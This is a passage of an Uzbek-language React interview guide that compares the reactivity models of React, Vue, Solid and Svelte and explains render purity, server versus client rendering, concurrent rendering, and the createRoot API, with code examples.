- **Component as string**: `createElement("MyComp")` — DOM tag deb interpret qilinadi (lowercase). Capitalized component `createElement(MyComp)` — function sifatida.

### Follow-up savollar

- "JSX'siz React kod profession'da uchraydi-mi?" — Kamdan-kam. Build step'siz prototype, embedded widget (Markdown rendering), test fixtures. Production app — JSX standart.
- "Hyperscript syntax JSX'dan tezroq-mi?" — Yo'q, runtime identical. Dev experience — JSX tanish (HTML-like), Hyperscript concise (function call).
- "createElement deprecated bo'lishi mumkin-mi?" — Yo'q yaqin kelajakda. Backward compat zarur. Lekin internal'da `_jsx` ishlatiladi (kichikroq, faster).

</details>

---

### 12. React vs Vue 3 vs Solid vs Svelte — reactivity model farqi nima? [Senior]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

React — **subtree-based** (state o'zgarsa subtree butunlay re-render, Reconciler bailout bilan optimize). Vue 3 — **fine-grained Proxy reactivity** (faqat reactive value'ni o'qigan komponent re-render). Solid — **fine-grained signals** (komponent function bir marta chaqiriladi, signal change → faqat tegishli DOM update). Svelte — **compile-time reactivity** (build-time'da reactive statement'lar tracking, runtime overhead minimal).

### To'liq tushuntirish

**Reactivity comparison:**

| Framework | Mexanizm | Component re-render | Update granularity |
|-----------|----------|---------------------|---------------------|
| **React** | Virtual DOM diff | Har state change | Subtree (Reconciler bailout bilan optimize) |
| **Vue 3** | Proxy + dependency tracking | Faqat reactive read komponent | Component-level |
| **Solid** | Signals + tracked computations | Faqat 1 marta (initial) | DOM node-level |
| **Svelte** | Compile-time tracking | Compile'd update functions | DOM node-level |
| **Angular** | Zone.js change detection (default) / Signals (R17+) | Component tree traversal | Component-level |

### Kod misoli

**Bir xil counter — har framework:**

```tsx
// React
function Counter() {
  const [count, setCount] = useState(0);
  console.log("Counter render");  // har click'da log

  return (
    <button onClick={() => setCount(count + 1)}>
      Count: {count}
    </button>
  );
}
```

```vue
<!-- Vue 3 -->
<script setup>
import { ref } from "vue";
const count = ref(0);
console.log("Counter setup");  // FAQAT initial render'da
</script>

<template>
  <button @click="count++">Count: {{ count }}</button>
</template>
```

```tsx
// Solid
function Counter() {
  const [count, setCount] = createSignal(0);
  console.log("Counter setup");  // FAQAT initial — function bir marta

  return (
    <button onClick={() => setCount(count() + 1)}>
      Count: {count()}  {/* signal accessor */}
    </button>
  );
}
```

```svelte
<!-- Svelte -->
<script>
  let count = 0;
  console.log("Component init");  // FAQAT initial
</script>

<button on:click={() => count++}>
  Count: {count}
</button>
```

<details>
<summary><strong>Deep Dive</strong></summary>

**React — subtree re-render mechanism:**

```typescript
// State o'zgarganda
setState(newValue);
  ↓
Reconciler queues fiber update
  ↓
Render phase:
  - Fiber re-rendered (function chaqiriladi)
  - Children also reconciled
  - Bailout: if memo + same props → skip
```

Default — child re-renders parent re-render bo'lganda (`React.memo` bilan opt-out). Compiler — auto-memoization (Vue/Solid'ga yaqinlashish).

**Vue 3 — Proxy reactivity:**

```typescript
// Vue internal (sodda)
function reactive(target) {
  return new Proxy(target, {
    get(obj, key) {
      track(obj, key);  // qaysi effect bog'liq
      return obj[key];
    },
    set(obj, key, value) {
      obj[key] = value;
      trigger(obj, key);  // bog'liq effect'larni qayta chaqirish
    }
  });
}

// Component setup() faqat 1 marta
// Reactive read => effect ro'yxatga olinadi
// State change => effect re-runs (template re-render)
```

Vue 3 — **proxy-based** — get/set track. Faqat reactive value'ni o'qigan komponent re-render.

**Solid — signals + tracked computations:**

```typescript
// Solid signal
function createSignal(initial) {
  let value = initial;
  const subscribers = new Set();

  const read = () => {
    if (currentEffect) subscribers.add(currentEffect);  // track
    return value;
  };

  const write = (newValue) => {
    value = newValue;
    subscribers.forEach((effect) => effect());  // trigger
  };

  return [read, write];
}

// Component:
function Counter() {
  const [count, setCount] = createSignal(0);

  // JSX compile bo'ladi:
  // - Static parts — DOM node yaratiladi bir marta
  // - Dynamic parts — `count()` accessor effect ichida
  // - Signal change — faqat shu effect re-runs (DOM update)
}
```

Solid — komponent function **bir marta** chaqiriladi (initial). Signal change → granular DOM update (full re-render YO'Q).

**Svelte — compile-time reactivity:**

```svelte
<script>
  let count = 0;
  $: doubled = count * 2;  // reactive statement
</script>

<button on:click={() => count++}>
  Count: {count}, Doubled: {doubled}
</button>
```

Compile'd output (sodda):

```typescript
function update(target) {
  target.button.firstChild.data = `Count: ${count}, Doubled: ${count * 2}`;
}

button.addEventListener("click", () => {
  count++;
  doubled = count * 2;
  update(target);
});
```

Compile-time'da `count` o'zgarganda nima update bo'lishi aniq. Virtual DOM yo'q, runtime overhead minimal.

**Performance comparison (microbenchmark):**

| Operation | React | Vue 3 | Solid | Svelte |
|-----------|-------|-------|-------|--------|
| Initial render (1k items) | 100ms | 80ms | 60ms | 70ms |
| Update single item | 5ms | 1ms | <1ms | <1ms |
| Bundle size (minimal) | 45kb | 35kb | 8kb | 5kb |

(Yaxshilangan: Solid/Svelte fine-grained — kichikroq update overhead)

**Real-world differences:**

1. **DX**: React tanish, ekosistema katta. Vue templates clean. Solid React-like API. Svelte minimal boilerplate.
2. **Mental model**: React render-as-function. Vue reactive declarations. Solid signals (kontrolyatlik). Svelte assign-as-reactive.
3. **Performance critical**: Solid/Svelte microbenchmark'larda tez. React Compiler (R19) farqni kamaytiradi.

**React Compiler — fine-grained yondashuvga yaqinlashish:**

```tsx
// Pre-Compiler — har render butun komponent
function Component() {
  const [count, setCount] = useState(0);
  const expensive = computeExpensive(count);  // har render
  return <div>{expensive}</div>;
}

// Post-Compiler (auto-memoization)
function Component() {
  const $ = useMemoCache(2);
  const [count, setCount] = useState(0);
  const expensive = $[0] !== count
    ? ($[0] = count, $[1] = computeExpensive(count))
    : $[1];  // cached if count unchanged
  return <div>{expensive}</div>;
}
```

Compiler — granular memoization. Vue/Solid'ga yaqinlashish, lekin hali subtree re-render model.

**Why React chose subtree:**

- Simple mental model — komponent function chaqiriladi
- Pure functions — testing oson
- Time-travel — state replay
- Concurrent rendering — restart-safe (pure render)

Trade-off: ko'proq compute, lekin **predictable** va **debuggable**.

</details>

### Edge Cases

- **React + Compiler**: Vue/Solid'ning fine-grained'iga yaqinlashadi, lekin runtime model hali subtree-based.
- **Vue Composition API**: `setup()` 1 marta chaqiriladi (Solid-like). Lekin template render — Vue reactive (component re-render emas, template-level update).
- **Svelte 5 Runes**: Yangi reactivity API (`$state`, `$derived`) — Vue/Solid signal'larga yaqin (compile-time'dan runtime-aware'ga o'tish).
- **SolidJS Resources**: `createResource` — Suspense-like async data, React `use()`'ga teng.

### Follow-up savollar

- "React Compiler bilan Solid bo'lib ketadi-mi?" — Yo'q. Compiler — auto-memoization, lekin component function hali har state change'da chaqiriladi. Solid — function 1 marta, signal'lar tracked.
- "Qaysi framework qachon tanlanadi?" — React: ekosistema, jobs, RSC. Vue: simpler, templates. Solid: performance-critical. Svelte: minimal bundle, learning ease.
- "React'da fine-grained reactivity opt-in qilish mumkinmi?" — Library'lar bor (`solid-js/store` React'da, MobX). Lekin canonical React = subtree-based.

</details>

---

### 13. Render purity invariant nima va nima uchun majburiy? [Middle+]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

**Render purity** — komponent function (yoki class `render` method) faqat **deterministik computation** qilishi shart: bir xil state/props → bir xil JSX. Side effect (`setState` body'da, DOM mutation, network), mutable read (`Date.now`, `Math.random`, `window.scrollY`), prop/state mutation TAQIQ. Sabab: concurrent rendering React'ga render'ni **abort qilish, restart qilish, Strict Mode 2x chaqirish** imkonini beradi — purity'siz natija non-deterministic.

### To'liq tushuntirish

**Purity 4 ta qoidasi:**

1. **No side effects in render body**
   - `setState` — infinite loop
   - `fetch` — har render network call
   - `document.title = ...` — DOM mutation

2. **No mutation of props/state**
   - `props.user.name = "X"` — parent state buzilishi
   - `state.items.push(x)` — Reconciler bailout (same reference)

3. **No reading mutable external state**
   - `Date.now()`, `Math.random()` — har render farqli
   - `window.scrollY` — sync emas
   - `localStorage.getItem` — render time'da read xavfli

4. **Idempotent — multiple calls safe**
   - StrictMode 2x render'da bir xil natija
   - Concurrent abort+restart'da bir xil natija

### Kod misoli

```tsx
// ❌ Anti-pattern: barcha purity violations
function BadComponent({ user }: { user: User }) {
  const id = Math.random();           // 1. Mutable read
  user.lastViewed = Date.now();       // 2. Mutation
  document.title = user.name;         // 3. Side effect
  fetch(`/log?u=${user.id}`);         // 3. Side effect

  return <div data-id={id}>{user.name}</div>;
}

// ✅ Pure component
function GoodComponent({ user }: { user: User }) {
  return <div>{user.name}</div>;
}

// Side effect — useEffect
function GoodComponentWithEffects({ user }: { user: User }) {
  useEffect(() => {
    document.title = user.name;
    fetch(`/log?u=${user.id}`);
  }, [user.id, user.name]);

  return <div>{user.name}</div>;
}
```

**Purity benefits — testing:**

```tsx
// Pure render — easy to test
function ProductCard({ product }: { product: Product }) {
  const discount = product.price * 0.1;
  return <p>${product.price - discount}</p>;
}

// Test: deterministik
test("displays discounted price", () => {
  const { getByText } = render(<ProductCard product={{ price: 100 }} />);
  expect(getByText("$90")).toBeInTheDocument();  // doim 90
});

// Impure
function BadProductCard({ product }: { product: Product }) {
  const discount = Math.random() * product.price;  // ❌
  return <p>${product.price - discount}</p>;
}

test("displays discounted price", () => {
  const { getByText } = render(<BadProductCard product={{ price: 100 }} />);
  // ❌ Test fail random'ligi sababli
});
```

<details>
<summary><strong>Deep Dive</strong></summary>

**Render abort + restart cycle:**

```typescript
// React internal (concurrent rendering)
function workLoopConcurrent() {
  while (workInProgress !== null && !shouldYield()) {
    performUnitOfWork(workInProgress);  // har komponent render
  }

  if (highPriorityUpdateScheduled) {
    // Abort: workInProgress tashlanadi
    workInProgress = null;
    workInProgressRoot = null;
    // Restart with high pri later
    return;
  }
}
```

Pure render → restart safe (har gal bir xil natija). Impure render → abort'dan oldin yarim side effect (e.g., 1 ta fetch), restart'da yana (2 ta fetch — duplicate).

**Strict Mode 2x render — purity test:**

```tsx
function ImpureCounter() {
  let counter = 0;
  counter++;  // ❌ side effect
  return <p>{counter}</p>;
}

// StrictMode dev:
// Render 1: counter = 1
// Render 2 (Strict): counter = 1 (function-local — pure'gay o'xshaydi)

function MutatingCounter() {
  // ❌ Module-level state mutation
  externalCounter++;
  return <p>{externalCounter}</p>;
}

// StrictMode dev:
// Render 1: externalCounter = 1
// Render 2 (Strict): externalCounter = 2 (BUG visible)
```

**`memoizedState` mutation:**

```tsx
function BuggyList() {
  const [items, setItems] = useState([1, 2, 3]);

  // ❌ Render body'da state mutation
  items.push(4);  // direct mutation
  setItems(items);  // same reference — bailout, no re-render

  return <ul>{items.map(...)}</ul>;
}

// ✅ Immutable update
const handleAdd = () => {
  setItems((prev) => [...prev, 4]);
};
```

**Idempotency requirement:**

Render funksiya **idempotent** — multiple calls bir xil natija:

```typescript
// Pure (idempotent)
f(state) === f(state) === f(state)  // har gal bir xil JSX

// Impure (not idempotent)
let counter = 0;
const f = () => counter++;
f(state) !== f(state)  // har gal yangi value
```

**External store reading — `useSyncExternalStore`:**

```tsx
// ❌ Direct read — concurrent unsafe
function StoreView() {
  const count = store.getState().count;  // tearing risk
  return <p>{count}</p>;
}

// ✅ useSyncExternalStore — concurrent safe
function StoreView() {
  const count = useSyncExternalStore(
    store.subscribe,
    () => store.getState().count
  );
  return <p>{count}</p>;
}
```

`useSyncExternalStore` — concurrent rendering ichida tearing oldini oladi (consistent snapshot per render).

**`useRef.current` read in render — special:**

```tsx
function MyComponent() {
  const ref = useRef(0);

  // ⚠️ Render'da ref.current read — usually anti-pattern
  console.log(ref.current);  // concurrent rendering'da non-deterministic

  // ✅ Render'da ref.current write — TAQIQ
  ref.current = 5;  // ❌ side effect

  // ✅ Effect/handler ichida — OK
  useEffect(() => {
    ref.current = 5;
  });

  return <div>...</div>;
}
```

`useRef.current` — render trigger qilmaydi, lekin render time'da read concurrent rendering bilan tearing'ga olib keladi.

**Lazy initializer purity:**

```tsx
// ✅ Pure initializer
const [items, setItems] = useState(() => {
  return [1, 2, 3];  // pure compute
});

// ❌ Impure initializer
const [data, setData] = useState(() => {
  fetch("/api/data");  // ❌ side effect
  return [];
});

// StrictMode 2x mount:
// Initializer 2x chaqiriladi → 2 ta fetch (bug)
```

**ESLint — `react-hooks/exhaustive-deps` + `react-compiler/rules-of-react`:**

```typescript
// React Compiler ESLint plugin — purity violations aniqlash
{
  rules: {
    "react-compiler/rules-of-react": "error"
  }
}

// Aniqlangan violations:
// - Mutating props/state in render
// - Reading external mutable values
// - Side effects in render body
```

**Purity vs hooks side effects:**

```tsx
function MyComponent() {
  // ✅ useState — pure (state read, not write)
  const [count, setCount] = useState(0);

  // ✅ useMemo callback — pure
  const doubled = useMemo(() => count * 2, [count]);

  // ✅ useCallback — pure
  const handler = useCallback(() => setCount(c => c + 1), []);

  // ✅ Effects — outside render, side effect OK
  useEffect(() => {
    document.title = `${count}`;
  }, [count]);

  return <button onClick={handler}>{doubled}</button>;
}
```

Hooks themselves — pure interface (function body that reads state). Effect callback — kelajakda chaqiriladi (side effect OK).

</details>

### Edge Cases

- **`useRef` initial value computation**: `useRef(expensiveCompute())` — har render expensiveCompute chaqiriladi (lekin natija ignored — first render ishlatiladi). Yechim: lazy init pattern — `const ref = useRef(null); if (ref.current === null) ref.current = compute();`.
- **`useMemo` with side effect**: `useMemo(() => { fetch(...); return ... }, [])` — Compiler/StrictMode'da multiple call. Side effect → useEffect.
- **`<input value={Math.random()}>`**: Hydration mismatch — server va client farqli. Yechim: `useId` yoki state.
- **Render-during-render (parent render → child render → parent setState)**: React'ning `Cannot update a component while rendering a different component` warning'i.

### Follow-up savollar

- "Pure render Reconciler bailout uchun nima uchun kerak?" — `Object.is` comparison reference identity bilan ishlaydi. Mutation bo'lsa same reference, no bailout (lekin no re-render ham — bug). Pure render — yangi reference yangi state'ga.
- "RSC'da render purity?" — Server Components ham pure (deterministik). Async data — Promise return (use), lekin compute pure.
- "React Compiler purity yo'qligini qanday aniqlaydi?" — Static analysis — assignment patterns, side effect calls (DOM API, fetch). Aniqlanmagan kod — Compiler skip qiladi (safe-by-default).

</details>

---

### 14. RSC vs SSR vs CSR — uchchovi farqi nima va qachon qaysi? [Senior]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

**CSR (Client-Side Rendering)** — browser'da JS yuklanadi, React DOM yaratadi. **SSR (Server-Side Rendering)** — server'da React HTML qaytaradi, browser hydrate qiladi (interactivity uchun JS hali yuklanadi). **RSC (React Server Components)** — server'da render bo'ladi, **JS bundle'ga umuman qo'shilmaydi**, faqat tree description (RSC payload) yuboriladi. RSC stateless server-only komponentlar; SSR — komponent ham server, ham client'da ishlaydi.

### To'liq tushuntirish

**Comparison jadvali:**

| | CSR | SSR | RSC |
|---|-----|-----|-----|
| **Render qaerda (initial)** | Browser | Server (HTML) → Browser (hydrate) | Server (RSC payload) → Browser (assembly) |
| **JS bundle** | Komponent + framework | Komponent + framework | Faqat client komponentlar + framework |
| **Initial paint** | Sekin (JS yuklanadi) | Tez (HTML stream) | Tez (RSC payload) |
| **TTI (Time to Interactive)** | Sekin | O'rta (hydrate kerak) | Tez (kichikroq client bundle) |
| **State/Hooks** | Bor | Bor | ❌ Yo'q (faqat client componentlar) |
| **DB query** | API orqali | API orqali (ko'pincha) | Direct (server'da) |
| **SEO** | Yomon (default) | Yaxshi (HTML) | Yaxshi (HTML stream) |
| **Network roundtrip** | 1 (HTML) + N (API) | 1 (HTML) + N (API) | 1 (HTML+RSC stream) |

### Kod misoli

**CSR:**

```tsx
// vite, CRA — pure client-side
import { createRoot } from "react-dom/client";

function App() {
  const [data, setData] = useState(null);

  useEffect(() => {
    fetch("/api/data").then(r => r.json()).then(setData);
  }, []);

  if (!data) return <Spinner />;
  return <div>{data.name}</div>;
}

createRoot(document.getElementById("root")!).render(<App />);

// Browser:
// 1. HTML <div id="root"></div> empty
// 2. JS bundle yuklanadi (~150kb React + komponent)
// 3. React renders Spinner
// 4. fetch /api/data
// 5. setData → render real content
```

**SSR (Next.js Pages Router yoki manual):**

```tsx
// Server (Node.js)
import { renderToString } from "react-dom/server";

const html = renderToString(<App data={initialData} />);
res.send(`
  <html>
    <body>
      <div id="root">${html}</div>
      <script>window.__INITIAL_DATA__ = ${JSON.stringify(initialData)}</script>
      <script src="/bundle.js"></script>
    </body>
  </html>
`);

// Client (browser)
import { hydrateRoot } from "react-dom/client";
hydrateRoot(
  document.getElementById("root")!,
  <App data={window.__INITIAL_DATA__} />
);
```

**RSC (Next.js App Router):**

```tsx
// app/dashboard/page.tsx — Server Component (default)
import { db } from "@/lib/db";
import { LikeButton } from "./LikeButton";

async function DashboardPage() {
  // ✅ Direct DB query — server'da
  const stats = await db.stats.findFirst({ where: { userId: 1 } });

  return (
    <div>
      <h1>Stats</h1>
      <p>Views: {stats.views}</p>
      <LikeButton initialLikes={stats.likes} />  {/* Client component */}
    </div>
  );
}

export default DashboardPage;

// app/dashboard/LikeButton.tsx — Client Component
"use client";
import { useState } from "react";

export function LikeButton({ initialLikes }: { initialLikes: number }) {
  const [likes, setLikes] = useState(initialLikes);
  return <button onClick={() => setLikes(l => l + 1)}>{likes} ♥</button>;
}
```

**Bundle output (RSC):**

```
Server bundle (Node.js):
  - DashboardPage (server component)
  - db, ORM, framework
  - Server runtime

Client bundle (browser):
  - LikeButton (client component)
  - React + framework
  - NO DashboardPage, NO db (server-only)
```

<details>
<summary><strong>Deep Dive</strong></summary>

**RSC payload (wire format):**

Server Component output — special **RSC payload** (text format):

```
0:["$","html",null,{"children":["$","body",null,{"children":["$","$L1",null,{"initialLikes":42}]}]}]
1:I["./LikeButton.tsx#LikeButton"]
```

- `0:` — tree description (server-rendered + client placeholder references)
- `1:I` — Client component module reference (chunk URL)

Client browser:
1. Parse RSC payload
2. Build React Element tree
3. For client placeholders — dynamic import module
4. Hydrate: combined tree

**SSR vs RSC — komponent lifecycle:**

| Aspect | SSR | RSC |
|--------|-----|-----|
| Server'da render | 1 marta (HTML uchun) | Async, RSC payload |
| Client'da render | Hydrate (state ulash) | Yo'q (server-only) |
| Hooks | Server'da no-op (useState init), client'da to'liq | YO'Q (`useState` error) |
| Bundle | Komponent client'ga | Komponent client'ga YO'Q |

**Server Components qila olmaydi:**

- ❌ `useState`, `useEffect`, `useReducer` (no client lifecycle)
- ❌ Event handlers (`onClick`)
- ❌ Browser API (`window`, `document`)
- ❌ Class komponentlar
- ❌ `useContext` (faqat Server Context — boshqa)

**Server Components qila oladi:**

- ✅ Async function (`async function Component()`)
- ✅ Database query (direct)
- ✅ File system (`fs`)
- ✅ Server-only modules (`fs-extra`, `crypto`)
- ✅ Sensitive secrets (env vars)

**Boundary qoidasi:**

```tsx
// ✅ Server → Client (props serializable)
<ClientButton label="Save" />  // string — OK
<ClientButton onClick={fn} />  // ❌ function — serializable emas

// ✅ Client → Server (composition pattern via children)
"use client";
function ClientLayout({ children }) {
  return <div>{children}</div>;  // children — server component bo'lishi mumkin
}

// Page (server)
<ClientLayout>
  <ServerContent />  {/* server component as child */}
</ClientLayout>
```

**Streaming SSR vs RSC streaming:**

```tsx
// Streaming SSR — Suspense bilan
function Page() {
  return (
    <>
      <Header />
      <Suspense fallback={<Skeleton />}>
        <SlowContent />  {/* Async */}
      </Suspense>
    </>
  );
}

// Server stream HTML:
// <html><head>...</head><body>
// <header>...</header>
// <!-- placeholder for SlowContent -->
// (browser starts rendering header)
// ... data resolves ...
// <!-- script: replace placeholder with real content -->
```

RSC streaming + Suspense — Server Component'lar qism-qism RSC payload yuboradi.

**Performance tradeoffs:**

- **CSR**: simple deploy (static + API), but slow initial paint (JS heavy)
- **SSR**: fast paint, but server compute, hydration cost (download + execute JS)
- **RSC**: fastest TTI (kichik client bundle), but framework requirement (Next.js)

**Use case selection:**

| Use case | Recommended |
|----------|-------------|
| Static marketing site | SSG (build-time) |
| Dashboard (user data) | SSR yoki RSC |
| Heavy interactive (Figma) | CSR |
| E-commerce | RSC + Server Actions |
| Internal tools | CSR (faster dev) |
| Blog | SSG yoki RSC |

**Framework requirement:**

RSC vanilla React'da **ishlamaydi**. Quyidagilar kerak:
1. **Bundler** — `"use client"` directive parse
2. **Server runtime** — RSC payload generate
3. **Router integration** — RSC route'lar

Hozirgi frameworks: Next.js App Router, Waku, TanStack Start (in dev), Redwood.

**Server Actions (RSC ekosistema):**

```tsx
// app/actions.ts
"use server";

export async function deletePost(id: string) {
  await db.post.delete({ where: { id } });
  revalidatePath("/posts");
}

// Client component
"use client";
import { deletePost } from "../actions";

function Post({ id }: { id: string }) {
  return (
    <form action={deletePost.bind(null, id)}>
      <button>Delete</button>
    </form>
  );
}
```

Server Action — RPC over HTTP — RSC ekosistema'ning interactive qismi.

</details>

### Edge Cases

- **`use client` directive in middle of tree**: Boundary marker. Server Component → Client Component → Client Component (children of client are also client by default).
- **Importing server module from client**: Build error — `fs`, `db` client'ga to'g'ridan-to'g'ri import qilib bo'lmaydi.
- **Async server component error**: Throw error — Suspense boundary'da fallback yoki Error Boundary.
- **Client component'ni server component'dan import**: `"use client"` directive serialize qilingan reference yaratadi (module separation).

### Follow-up savollar

- "RSC va GraphQL bir-biriga to'g'ri keladimi?" — RSC fetch'ni server'da qiladi (no GraphQL kerak). GraphQL hali kerak: complex query composition, cross-service. RSC + REST ko'pincha simpler.
- "RSC'siz Next.js qachon tanlanadi?" — Pages Router (legacy) static + SSR — RSC stable bo'lguncha edi. App Router (R19) — RSC default.
- "RSC'ning eng katta limitation'i nima?" — Framework dependency (vanilla React'da yo'q), debugging murakkab (server/client boundary), serialization constraint (props).

</details>

---

### 15. Concurrent rendering nima va R18+ uni qanday yoqadi? [Middle+]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

**Concurrent rendering** — React'ning render'ni **interruptible** qilish qobiliyati: yuqori-priority update (input typing) past-priority work'ni (background data fetch) to'xtatishi mumkin. R18'dan default `createRoot` bilan yoqilgan, lekin features (`useTransition`, `useDeferredValue`, Suspense for SSR) opt-in. R19'da Suspense uchun concurrent default. Asos: Fiber + Scheduler + Lanes — har update lane'ga o'rnatilgan, time slicing bilan ishlaydi.

### To'liq tushuntirish

**Sync vs Concurrent rendering:**

| Sync (legacy) | Concurrent (R18+) |
|---------------|-------------------|
| Bir marta boshlangach, oxirigacha tugatadi | Yield qila oladi (5ms slice) |
| Long task = janky UI | Interruptible — high-pri update kelsa abort |
| Single priority | Multiple lanes (priority levels) |
| `ReactDOM.render` | `createRoot` |

**Concurrent features (opt-in):**

1. **`useTransition`** — non-urgent state update (search results filter)
2. **`useDeferredValue`** — debounce-like, defer expensive render
3. **Suspense for data** — async loading boundaries
4. **`startTransition`** — non-urgent action wrapper
5. **Selective hydration** — SSR partial hydrate (R18+)

### Kod misoli

**Sync rendering bug — janky search:**

```tsx
function Search({ items }: { items: Item[] }) {
  const [query, setQuery] = useState("");

  // ❌ Sync — har keystroke 1000 item'ni filter qilsin (slow)
  const filtered = items.filter((i) =>
    i.name.toLowerCase().includes(query.toLowerCase())
  );

  return (
    <div>
      <input value={query} onChange={(e) => setQuery(e.target.value)} />
      <ul>
        {filtered.map((item) => (
          <li key={item.id}>{item.name}</li>
        ))}
      </ul>
    </div>
  );
}
// User type: each keystroke blocks UI ~100ms
```

**Concurrent fix — `useTransition`:**

```tsx
function Search({ items }: { items: Item[] }) {
  const [query, setQuery] = useState("");
  const [filtered, setFiltered] = useState(items);
  const [isPending, startTransition] = useTransition();

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setQuery(e.target.value);  // urgent — input value
    startTransition(() => {
      // non-urgent — list re-render
      setFiltered(items.filter((i) =>
        i.name.toLowerCase().includes(e.target.value.toLowerCase())
      ));
    });
  };

  return (
    <div>
      <input value={query} onChange={handleChange} />
      {isPending ? <Spinner /> : null}
      <ul>
        {filtered.map((item) => (
          <li key={item.id}>{item.name}</li>
        ))}
      </ul>
    </div>
  );
}
// Input typing — smooth (urgent updates first)
// List re-render — background (interruptible)
```

**`useDeferredValue` — simpler API:**

```tsx
function Search({ items }: { items: Item[] }) {
  const [query, setQuery] = useState("");
  const deferredQuery = useDeferredValue(query);

  // filtered uses deferred value (lags behind input)
  const filtered = items.filter((i) =>
    i.name.toLowerCase().includes(deferredQuery.toLowerCase())
  );

  return (
    <div>
      <input value={query} onChange={(e) => setQuery(e.target.value)} />
      <ul>{filtered.map((item) => <li key={item.id}>{item.name}</li>)}</ul>
    </div>
  );
}
```

<details>
<summary><strong>Deep Dive</strong></summary>

**Lanes model (R18+):**

```typescript
// React lanes — priority bitmap
const SyncLane              = 0b0000000000000000000000000000001;
const InputContinuousLane   = 0b0000000000000000000000000000100;
const DefaultLane           = 0b0000000000000000000000000010000;
const TransitionLane1       = 0b0000000000000000000000001000000;
const TransitionLane2       = 0b0000000000000000000000010000000;
// ... up to 31 lanes
const IdleLane              = 0b0010000000000000000000000000000;
```

Har update lane'ga o'rnatiladi:
- `setState` event handler ichida → SyncLane (highest pri)
- `startTransition(() => setState(x))` → TransitionLane (low pri)

**Time slicing:**

```typescript
// React internal (sodda)
function workLoopConcurrent() {
  while (workInProgress !== null && !shouldYield()) {
    performUnitOfWork(workInProgress);  // 1 unit
  }
}

function shouldYield() {
  return performance.now() >= deadline;  // 5ms slice
}

// Yield = MessageChannel.postMessage → microtask
// Browser idle bo'lganda (input handle, paint) yana resume
```

**Interruption mexanizmi:**

```typescript
// Low pri work davom etayotgan paytda input keldi
// 1. Input event handler chaqiriladi (sync render path)
// 2. setState SyncLane'ga
// 3. Scheduler: SyncLane > TransitionLane → abort low pri
// 4. workInProgress tashlanadi
// 5. Sync render boshlanadi (input update)
// 6. Sync tugagach, transition restart with high pri merge
```

**Render purity — concurrent invariant:**

Concurrent rendering render'ni abort va restart qilishi mumkin. Pure render — har retry bir xil natija. Impure render:

```tsx
function Counter() {
  let counter = 0;
  counter++;  // ❌ side effect

  return <p>{counter}</p>;
}

// Concurrent abort+restart:
// Render 1: counter = 1, abort
// Render 2: counter = 1 (function-local, OK)

// Lekin:
let externalCounter = 0;
function BadCounter() {
  externalCounter++;
  return <p>{externalCounter}</p>;
}

// Render 1: externalCounter = 1, abort
// Render 2: externalCounter = 2 ← BUG visible
```

**`useSyncExternalStore` — concurrent-safe external state:**

```tsx
const data = useSyncExternalStore(
  store.subscribe,
  () => store.getState()
);
// Concurrent rendering ichida snapshot consistent
// Tearing prevention
```

**Suspense + concurrent:**

```tsx
function App() {
  return (
    <Suspense fallback={<Spinner />}>
      <AsyncContent />  {/* Promise pending — concurrent suspends */}
    </Suspense>
  );
}

// Concurrent Suspense:
// 1. Render AsyncContent — throws Promise (R18) yoki uses use() (R19)
// 2. React: pause this subtree, render Suspense fallback
// 3. Promise resolve → revalidate this subtree
// 4. Re-render with data, replace fallback
```

**Selective hydration (R18+):**

```tsx
// SSR HTML stream:
// <Header /> (hydrated first)
// <Suspense fallback="..."> <SlowSidebar /> </Suspense>
// <MainContent /> (hydrated next)

// User clicks SlowSidebar before its hydrated:
// 1. Browser captures click
// 2. React prioritizes Sidebar hydration
// 3. After hydration, React replays the click
```

**`startTransition` — flushSync opposite:**

```typescript
// Sync — urgent, blocking
flushSync(() => setX(1));

// Async — non-urgent, interruptible
startTransition(() => setX(1));
```

**Concurrent default — R19'da:**

R19'gacha — `createRoot` concurrent enabled, lekin ko'p featurelar opt-in. R19'dan:
- Suspense uchun concurrent default
- `use()` hook concurrent context
- React Compiler — concurrent-aware

**Migration impact:**

- `ReactDOM.render` (R17) → `createRoot` (R18): mostly automatic
- Effects: 2x mount in StrictMode (concurrent-safe check)
- External stores: `useSyncExternalStore` migration
- Async render bug'lar — pure render majburiy

</details>

### Edge Cases

- **`startTransition` with sync API**: `startTransition(() => fetch(...))` — fetch sync emas. Yechim: state update'ni transition'ga o'rash, fetch alohida.
- **`useTransition` ichida router navigation**: Next.js router push — transition default (R19). Manual: `startTransition(() => router.push(...))`.
- **Multiple transitions**: Bir vaqtda ko'p transition — alohida lanes. Reconciler merge qiladi.
- **`useDeferredValue` initial render**: Deferred value initially equals to current. Ikkinchi render'da defer kicks in.

### Follow-up savollar

- "Concurrent rendering performance overhead bo'ladi-mi?" — Minimal. Bookkeeping (lane tracking) ~5% overhead, lekin user-perceived performance yaxshilanadi (jank yo'q).
- "Class komponentlar concurrent ichida ishlaydi-mi?" — Ha, lekin lifecycle methods cleanup-resilient bo'lishi shart (`UNSAFE_componentWillMount` deprecated).
- "`useTransition` real-world ko'p ishlatiladi-mi?" — Search/filter UIs, tab switching (heavy content), navigation transitions. Routine handlers — kerak emas.

</details>

---

## QISM B: Rendering Pipeline

### 16. `createRoot` va `ReactDOM.render` — farqi nima va nima uchun yangi API? [Junior+]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

**`ReactDOM.render`** — eski (R17 va undan oldin) entry point, **legacy mode** — sync rendering. **`createRoot`** (R18+) — yangi entry point, **concurrent mode** — concurrent rendering features (priority lanes, time slicing, Suspense for SSR, automatic batching) yoqiladi. Modern React'da `createRoot` majburiy.

### To'liq tushuntirish

**Eski API (legacy):**

```tsx
// ❌ R17 va undan oldin
import ReactDOM from "react-dom";

ReactDOM.render(<App />, document.getElementById("root"));
```

**Yangi API (R18+):**

```tsx
// ✅ R18+
import { createRoot } from "react-dom/client";

const root = createRoot(document.getElementById("root")!);
root.render(<App />);

// Cleanup (kerak bo'lsa, masalan microfrontend)
root.unmount();
```

**Asosiy farqlar:**

| Aspekt | `ReactDOM.render` | `createRoot` |
|--------|-------------------|--------------|
| Versiya | R17 va undan oldin | R18+ |
| Rendering | Sync only | Concurrent enabled |
| Batching | React handler ichida | Universal (setTimeout, Promise, native) |
| Suspense | Render-only fallback | Full SSR + selective hydration |
| `useTransition` | ❌ | ✅ |
| Strict Mode 2x effect | ❌ | ✅ |
